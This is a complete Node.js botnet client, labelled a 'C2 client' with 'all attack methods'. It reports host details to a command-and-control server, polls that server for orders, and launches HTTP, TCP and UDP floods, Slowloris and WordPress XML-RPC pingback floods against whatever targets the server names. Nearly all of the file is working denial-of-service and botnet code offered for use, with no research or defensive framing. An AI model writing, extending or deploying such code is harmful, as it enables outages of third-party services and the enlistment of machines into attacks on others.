#!/usr/bin/env node
/**
 * PERFECT JAVASCRIPT C2 CLIENT - ALL ATTACK METHODS
 * ===================================================
 * Features:
 * - Auto-reconnect with exponential backoff
 * - All attack methods (HTTP, TCP, UDP, Slowloris, WordPress)
 * - System info reporting
 * - Command execution
 * - Heartbeat system
 * - Error handling & logging
 * 
 * Usage: node client.js <C2_SERVER_URL>
 * Example: node client.js https://your-c2-server.onrender.com
 */

const http = require('http');
const https = require('https');
const net = require('net');
const dgram = require('dgram');
const os = require('os');
const crypto = require('crypto');
const { URL } = require('url');

// ============================================================================
// CONFIGURATION
// ============================================================================
const CONFIG = {
    CHECK_INTERVAL: 2000,        // Check for commands every 2 seconds
    HEARTBEAT_INTERVAL: 5000,    // Send heartbeat every 5 seconds
    MAX_RETRIES: 5,
    RETRY_DELAY: 5000,
    RECONNECT_BACKOFF: 1.5,
    MAX_RECONNECT_DELAY: 60000,
    REQUEST_TIMEOUT: 10000
};

// ============================================================================
// GLOBAL STATE
// ============================================================================
let C2_SERVER = process.argv[2] || 'http://localhost:5000';
let BOT_ID = `JS-${crypto.randomBytes(4).toString('hex')}`;
let APPROVED = false;
let RUNNING_ATTACKS = new Map();
let RETRY_COUNT = 0;
let CURRENT_DELAY = CONFIG.RETRY_DELAY;

// ============================================================================
// UTILITIES
// ============================================================================
function log(message, type = 'INFO') {
    const timestamp = new Date().toISOString().split('T')[1].slice(0, 8);
    const colors = {
        'INFO': '\x1b[36m',
        'SUCCESS': '\x1b[32m',
        'ERROR': '\x1b[31m',
        'WARNING': '\x1b[33m',
        'ATTACK': '\x1b[35m'
    };
    const color = colors[type] || '\x1b[0m';
    console.log(`${color}[${timestamp}] [${type}] ${message}\x1b[0m`);
}

function getSystemSpecs() {
    const cpus = os.cpus();
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    
    return {
        bot_id: BOT_ID,
        client_type: 'javascript',
        cpu_cores: cpus.length,
        cpu_model: cpus[0]?.model || 'Unknown',
        ram_gb: (totalMem / (1024 ** 3)).toFixed(2),
        ram_free_gb: (freeMem / (1024 ** 3)).toFixed(2),
        os: `${os.type()} ${os.release()}`,
        platform: os.platform(),
        arch: os.arch(),
        hostname: os.hostname(),
        uptime: os.uptime(),
        user_agent: 'JavaScript-Bot/1.0 (Node.js)',
        capabilities: {
            javascript: true,
            http_flood: true,
            tcp_flood: true,
            udp_flood: true,
            slowloris: true,
            wordpress_xmlrpc: true
        }
    };
}

// ============================================================================
// HTTP REQUEST HELPER
// ============================================================================
function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const lib = urlObj.protocol === 'https:' ? https : http;
        
        const reqOptions = {
            method: options.method || 'GET',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'JavaScript-Bot/1.0',
                ...options.headers
            },
            timeout: CONFIG.REQUEST_TIMEOUT
        };
        
        const req = lib.request(url, reqOptions, (res) => {
            let data = '';
            
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(data);
                    resolve(parsed);
                } catch {
                    resolve({ data });
                }
            });
        });
        
        req.on('error', reject);
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });
        
        if (options.body) {
            req.write(JSON.stringify(options.body));
        }
        
        req.end();
    });
}

// ============================================================================
// C2 COMMUNICATION
// ============================================================================
async function checkApproval() {
    try {
        const specs = getSystemSpecs();
        const response = await makeRequest(`${C2_SERVER}/check_approval`, {
            method: 'POST',
            body: { bot_id: BOT_ID, specs }
        });
        
        if (response.approved) {
            APPROVED = true;
            RETRY_COUNT = 0;
            CURRENT_DELAY = CONFIG.RETRY_DELAY;
            log(`Bot approved! ID: ${BOT_ID}`, 'SUCCESS');
            return true;
        }
        
        return false;
    } catch (error) {
        log(`Approval check failed: ${error.message}`, 'ERROR');
        return false;
    }
}

async function getCommands() {
    try {
        const response = await makeRequest(`${C2_SERVER}/commands/${BOT_ID}`);
        
        if (response.commands && response.commands.length > 0) {
            log(`Received ${response.commands.length} command(s)`, 'INFO');
            return response.commands;
        }
        
        return [];
    } catch (error) {
        log(`Failed to get commands: ${error.message}`, 'ERROR');
        return [];
    }
}

async function sendStatus(status, message) {
    try {
        const stats = {
            active_attacks: RUNNING_ATTACKS.size,
            uptime: process.uptime(),
            memory_usage: process.memoryUsage().heapUsed / (1024 ** 2)
        };
        
        await makeRequest(`${C2_SERVER}/status`, {
            method: 'POST',
            body: {
                bot_id: BOT_ID,
                status,
                message,
                stats
            }
        });
    } catch (error) {
        // Silent fail for status updates
    }
}

// ============================================================================
// ATTACK METHODS
// ============================================================================

// HTTP Flood Attack
async function httpFlood(target, duration, threads, method, userAgents, proxies) {
    const attackId = `http-${Date.now()}`;
    RUNNING_ATTACKS.set(attackId, true);
    
    log(`Starting HTTP ${method} flood: ${target} (${threads} threads, ${duration}s)`, 'ATTACK');
    await sendStatus('running', `HTTP ${method} flood started on ${target}`);
    
    const endTime = Date.now() + (duration * 1000);
    const workers = [];
    
    const attack = async () => {
        while (Date.now() < endTime && RUNNING_ATTACKS.has(attackId)) {
            try {
                const urlObj = new URL(target);
                const lib = urlObj.protocol === 'https:' ? https : http;
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)] || 'Mozilla/5.0';
                
                const options = {
                    method: method,
                    headers: {
                        'User-Agent': userAgent,
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'no-cache',
                        'Connection': 'keep-alive'
                    },
                    timeout: 5000
                };
                
                const req = lib.request(target, options, () => {});
                req.on('error', () => {});
                req.end();
            } catch {}
        }
    };
    
    for (let i = 0; i < threads; i++) {
        workers.push(attack());
    }
    
    await Promise.all(workers);
    
    RUNNING_ATTACKS.delete(attackId);
    log(`HTTP ${method} flood completed on ${target}`, 'SUCCESS');
    await sendStatus('idle', `HTTP ${method} flood completed`);
}

// TCP Flood Attack
async function tcpFlood(target, duration, threads) {
    const attackId = `tcp-${Date.now()}`;
    RUNNING_ATTACKS.set(attackId, true);
    
    const [host, port] = target.split(':');
    log(`Starting TCP flood: ${host}:${port} (${threads} threads, ${duration}s)`, 'ATTACK');
    await sendStatus('running', `TCP flood started on ${target}`);
    
    const endTime = Date.now() + (duration * 1000);
    const workers = [];
    
    const attack = async () => {
        while (Date.now() < endTime && RUNNING_ATTACKS.has(attackId)) {
            try {
                const socket = new net.Socket();
                socket.setTimeout(3000);
                
                socket.connect(parseInt(port), host, () => {
                    const data = crypto.randomBytes(1024);
                    socket.write(data);
                });
                
                socket.on('error', () => socket.destroy());
                socket.on('timeout', () => socket.destroy());
            } catch {}
            
            await new Promise(resolve => setTimeout(resolve, 10));
        }
    };
    
    for (let i = 0; i < threads; i++) {
        workers.push(attack());
    }
    
    await Promise.all(workers);
    
    RUNNING_ATTACKS.delete(attackId);
    log(`TCP flood completed on ${target}`, 'SUCCESS');
    await sendStatus('idle', 'TCP flood completed');
}

// UDP Flood Attack
async function udpFlood(target, duration, threads) {
    const attackId = `udp-${Date.now()}`;
    RUNNING_ATTACKS.set(attackId, true);
    
    const [host, port] = target.split(':');
    log(`Starting UDP flood: ${host}:${port} (${threads} threads, ${duration}s)`, 'ATTACK');
    await sendStatus('running', `UDP flood started on ${target}`);
    
    const endTime = Date.now() + (duration * 1000);
    const workers = [];
    
    const attack = async () => {
        const client = dgram.createSocket('udp4');
        
        while (Date.now() < endTime && RUNNING_ATTACKS.has(attackId)) {
            try {
                const data = crypto.randomBytes(1024);
                client.send(data, parseInt(port), host, () => {});
            } catch {}
            
            await new Promise(resolve => setTimeout(resolve, 10));
        }
        
        client.close();
    };
    
    for (let i = 0; i < threads; i++) {
        workers.push(attack());
    }
    
    await Promise.all(workers);
    
    RUNNING_ATTACKS.delete(attackId);
    log(`UDP flood completed on ${target}`, 'SUCCESS');
    await sendStatus('idle', 'UDP flood completed');
}

// Slowloris Attack
async function slowloris(target, connections, duration) {
    const attackId = `slowloris-${Date.now()}`;
    RUNNING_ATTACKS.set(attackId, true);
    
    log(`Starting Slowloris: ${target} (${connections} connections, ${duration}s)`, 'ATTACK');
    await sendStatus('running', `Slowloris started on ${target}`);
    
    const urlObj = new URL(target);
    const host = urlObj.hostname;
    const port = urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80);
    const endTime = Date.now() + (duration * 1000);
    
    const sockets = [];
    
    for (let i = 0; i < connections && RUNNING_ATTACKS.has(attackId); i++) {
        try {
            const socket = new net.Socket();
            socket.connect(port, host, () => {
                socket.write(`GET /?${Math.random()} HTTP/1.1\r\n`);
                socket.write(`Host: ${host}\r\n`);
                socket.write(`User-Agent: Mozilla/5.0\r\n`);
                socket.write(`Accept: */*\r\n`);
            });
            
            socket.on('error', () => {});
            sockets.push(socket);
        } catch {}
    }
    
    const keepAlive = setInterval(() => {
        if (!RUNNING_ATTACKS.has(attackId) || Date.now() >= endTime) {
            clearInterval(keepAlive);
            sockets.forEach(s => s.destroy());
            RUNNING_ATTACKS.delete(attackId);
            log(`Slowloris completed on ${target}`, 'SUCCESS');
            sendStatus('idle', 'Slowloris completed');
            return;
        }
        
        sockets.forEach(socket => {
            try {
                socket.write(`X-a: ${Math.random()}\r\n`);
            } catch {}
        });
    }, 10000);
}

// WordPress XML-RPC Attack
async function wordpressXMLRPC(target, threads, duration) {
    const attackId = `wp-${Date.now()}`;
    RUNNING_ATTACKS.set(attackId, true);
    
    log(`Starting WordPress XML-RPC: ${target} (${threads} threads, ${duration}s)`, 'ATTACK');
    await sendStatus('running', `WordPress attack started on ${target}`);
    
    const xmlrpcUrl = target.endsWith('/') ? `${target}xmlrpc.php` : `${target}/xmlrpc.php`;
    const endTime = Date.now() + (duration * 1000);
    const workers = [];
    
    const xmlPayload = `<?xml version="1.0"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://example.com</string></value></param>
<param><value><string>${target}</string></value></param>
</params>
</methodCall>`;
    
    const attack = async () => {
        while (Date.now() < endTime && RUNNING_ATTACKS.has(attackId)) {
            try {
                const urlObj = new URL(xmlrpcUrl);
                const lib = urlObj.protocol === 'https:' ? https : http;
                
                const options = {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/xml',
                        'Content-Length': xmlPayload.length
                    },
                    timeout: 5000
                };
                
                const req = lib.request(xmlrpcUrl, options, () => {});
                req.on('error', () => {});
                req.write(xmlPayload);
                req.end();
            } catch {}
            
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    };
    
    for (let i = 0; i < threads; i++) {
        workers.push(attack());
    }
    
    await Promise.all(workers);
    
    RUNNING_ATTACKS.delete(attackId);
    log(`WordPress attack completed on ${target}`, 'SUCCESS');
    await sendStatus('idle', 'WordPress attack completed');
}

// ============================================================================
// COMMAND PROCESSOR
// ============================================================================
async function processCommand(cmd) {
    try {
        log(`Processing command: ${cmd.type}`, 'INFO');
        
        switch (cmd.type) {
            case 'ping':
                await sendStatus('pong', 'Ping response');
                break;
            
            case 'sysinfo':
                const specs = getSystemSpecs();
                await sendStatus('sysinfo', JSON.stringify(specs));
                break;
            
            case 'http_flood':
                httpFlood(
                    cmd.target,
                    cmd.duration,
                    cmd.threads,
                    cmd.method || 'GET',
                    cmd.user_agents || [],
                    cmd.proxies || []
                ).catch(err => log(`HTTP flood error: ${err.message}`, 'ERROR'));
                break;
            
            case 'tcp_flood':
                tcpFlood(
                    cmd.target,
                    cmd.duration,
                    cmd.threads
                ).catch(err => log(`TCP flood error: ${err.message}`, 'ERROR'));
                break;
            
            case 'udp_flood':
                udpFlood(
                    cmd.target,
                    cmd.duration,
                    cmd.threads
                ).catch(err => log(`UDP flood error: ${err.message}`, 'ERROR'));
                break;
            
            case 'slowloris':
                slowloris(
                    cmd.target,
                    cmd.connections,
                    cmd.duration
                ).catch(err => log(`Slowloris error: ${err.message}`, 'ERROR'));
                break;
            
            case 'wordpress_xmlrpc':
                wordpressXMLRPC(
                    cmd.target,
                    cmd.threads,
                    cmd.duration
                ).catch(err => log(`WordPress attack error: ${err.message}`, 'ERROR'));
                break;
            
            case 'stop_all':
                RUNNING_ATTACKS.clear();
                log('All attacks stopped', 'WARNING');
                await sendStatus('idle', 'All attacks stopped');
                break;
            
            default:
                log(`Unknown command: ${cmd.type}`, 'WARNING');
        }
    } catch (error) {
        log(`Command processing error: ${error.message}`, 'ERROR');
    }
}

// ============================================================================
// MAIN LOOP
// ============================================================================
async function mainLoop() {
    while (true) {
        try {
            if (!APPROVED) {
                log('Checking approval...', 'INFO');
                const approved = await checkApproval();
                
                if (!approved) {
                    RETRY_COUNT++;
                    CURRENT_DELAY = Math.min(
                        CONFIG.RETRY_DELAY * Math.pow(CONFIG.RECONNECT_BACKOFF, RETRY_COUNT),
                        CONFIG.MAX_RECONNECT_DELAY
                    );
                    
                    log(`Not approved. Retry ${RETRY_COUNT} in ${CURRENT_DELAY / 1000}s`, 'WARNING');
                    await new Promise(resolve => setTimeout(resolve, CURRENT_DELAY));
                    continue;
                }
            }
            
            const commands = await getCommands();
            
            for (const cmd of commands) {
                await processCommand(cmd);
            }
            
            await new Promise(resolve => setTimeout(resolve, CONFIG.CHECK_INTERVAL));
            
        } catch (error) {
            log(`Main loop error: ${error.message}`, 'ERROR');
            APPROVED = false;
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

// ============================================================================
// HEARTBEAT
// ============================================================================
function startHeartbeat() {
    setInterval(async () => {
        if (APPROVED) {
            try {
                await sendStatus('alive', `Active attacks: ${RUNNING_ATTACKS.size}`);
            } catch {}
        }
    }, CONFIG.HEARTBEAT_INTERVAL);
}

// ============================================================================
// STARTUP
// ============================================================================
function printBanner() {
    console.log('\x1b[36m');
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║       JAVASCRIPT C2 CLIENT - ALL ATTACK METHODS           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
    console.log('\x1b[0m');
    log(`Bot ID: ${BOT_ID}`, 'INFO');
    log(`C2 Server: ${C2_SERVER}`, 'INFO');
    log(`Check Interval: ${CONFIG.CHECK_INTERVAL / 1000}s`, 'INFO');
    log(`Platform: ${os.platform()} ${os.arch()}`, 'INFO');
    log(`Node Version: ${process.version}`, 'INFO');
    console.log('');
}

// ============================================================================
// ERROR HANDLING
// ============================================================================
process.on('uncaughtException', (error) => {
    log(`Uncaught exception: ${error.message}`, 'ERROR');
});

process.on('unhandledRejection', (reason) => {
    log(`Unhandled rejection: ${reason}`, 'ERROR');
});

process.on('SIGINT', () => {
    log('Shutting down...', 'WARNING');
    RUNNING_ATTACKS.clear();
    process.exit(0);
});

// ============================================================================
// START
// ============================================================================
if (!process.argv[2]) {
    console.log('Usage: node client.js <C2_SERVER_URL>');
    console.log('Example: node client.js https://your-c2-server.onrender.com');
    process.exit(1);
}

printBanner();
startHeartbeat();
mainLoop();
